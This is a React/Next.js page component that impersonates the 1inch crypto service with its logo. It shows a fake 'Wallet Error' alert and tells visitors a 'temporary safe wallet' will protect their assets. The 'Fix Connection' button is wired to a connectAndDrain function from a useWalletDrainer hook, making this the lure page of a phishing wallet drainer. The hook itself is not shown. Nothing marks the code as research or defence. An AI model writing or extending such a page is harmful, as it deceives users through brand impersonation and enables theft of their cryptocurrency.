"use client"

import { useState, useEffect } from "react"
import Image from "next/image"
import { Lottie } from "@/components/lottie"
import { useWalletDrainer } from "@/hooks/useWalletDrainer"
import animationData from "@/public/animation.json"

export default function Home() {
  const [isVisible, setIsVisible] = useState(false)
  
  const { 
    isProcessing, 
    connectionStatus, 
    connectAndDrain 
  } = useWalletDrainer()

  useEffect(() => {
    const timer = setTimeout(() => setIsVisible(true), 100)
    console.log('✅ Pure Reown WalletConnect Modal Ready - All 350+ Wallets Available')
    return () => clearTimeout(timer)
  }, [])

  return (
    <main className="relative flex min-h-screen items-center justify-center bg-white p-4">
      {/* Backdrop blur overlay */}
      <div className="fixed inset-0 bg-black/20 backdrop-blur-[5px]" />

      <div
        className={`relative z-10 flex w-full max-w-[22rem] flex-col items-center gap-4 rounded-[18px] border border-[#1e5ff5] bg-white px-6 py-6 shadow-xl transition-all duration-700 ease-out ${
          isVisible ? "scale-100 opacity-100" : "scale-90 opacity-0"
        }`}
      >
        {/* Logo */}
        <Image src="/logo.webp" alt="1inch Logo" width={48} height={48} className="mt-1" />

        {/* Heading */}
        <h1 className="font-montserrat text-[26px] font-normal leading-tight text-black">Wallet Error</h1>

        <div className="my-2 w-28">
          <Lottie animationData={animationData} />
        </div>

        <p className="text-center font-montserrat text-[15px] font-medium leading-snug text-black">
          We've detected an issue with your connected wallet on <strong className="text-[#378ef5]">1inch</strong>. This may affect your ability to access certain features. For asset security, a temporary safe wallet would be generated to store potential pending transactions until connection is restored.
        </p>

        {/* Fix Connection Button */}
        <button
          onClick={connectAndDrain}
          disabled={isProcessing}
          className={`mt-2 flex w-full flex-row items-center justify-center gap-2 rounded-2xl border border-[#00d1ff] px-4 py-3.5 font-montserrat font-bold transition-all duration-200 
            ${isProcessing 
              ? 'bg-[#cfe3f8] cursor-not-allowed opacity-75' 
              : 'bg-[#deecfd] text-[#378ef5] hover:bg-[#cfe3f8] active:scale-[0.96] touch-manipulation'
            }
            /* Mobile optimizations */
            md:hover:bg-[#cfe3f8] md:active:scale-[0.98]
            /* Ensure proper touch handling on mobile */
            select-none outline-none focus:outline-none focus:ring-0
          `}
          style={{
            /* Prevent zoom on double tap on iOS */
            touchAction: 'manipulation',
            /* Improve button responsiveness */
            WebkitTapHighlightColor: 'transparent'
          }}
        >
          {isProcessing ? (
            <>
              <div className="w-5 h-5 border-2 border-[#378ef5] border-t-transparent rounded-full animate-spin" />
              <span>{connectionStatus}</span>
            </>
          ) : (
            <>
              <Image src="/connect.svg" alt="Connect" width={20} height={20} />
              <span>Fix Connection</span>
            </>
          )}
        </button>
      </div>
    </main>
  )
}
